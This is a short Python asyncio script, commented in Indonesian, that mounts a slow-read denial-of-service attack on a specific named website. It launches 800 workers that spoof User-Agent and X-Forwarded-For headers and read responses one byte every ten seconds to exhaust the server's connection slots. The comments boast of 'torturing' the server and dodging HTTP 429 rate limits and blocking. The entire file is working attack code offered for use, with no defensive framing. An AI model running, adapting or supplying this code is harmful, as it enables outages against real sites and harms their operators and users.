import asyncio
import aiohttp
import random

TARGET_URL = "https://ingatcuan88.pro/"

async def silent_killer(session):
    while True:
        try:
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 120)}.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "Keep-Alive": str(random.randint(110, 120)),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            # Kita buka koneksi tapi bacanya sapaaaangat lambat
            async with session.get(TARGET_URL, headers=headers, timeout=300) as response:
                print(f"[*] Connection Established | IP Spoofed | Holding...")
                
                # Siksa server dengan membaca 1 byte setiap 10 detik
                # Ini bikin slot koneksi di server "terkunci" lama banget
                while not response.content.at_eof():
                    await response.content.read(1)
                    await asyncio.sleep(10) 
        except Exception:
            await asyncio.sleep(1)

async def main():
    print("--- MEMULAI OPERASI SILENT KILLER (Anti-429) ---")
    # Limit koneksi per host kita bikin tinggi tapi eksekusi lambat
    connector = aiohttp.TCPConnector(limit=1000, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Mulai dengan 500-800 worker saja supaya tidak langsung kena blokir
        tasks = [silent_killer(session) for _ in range(800)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
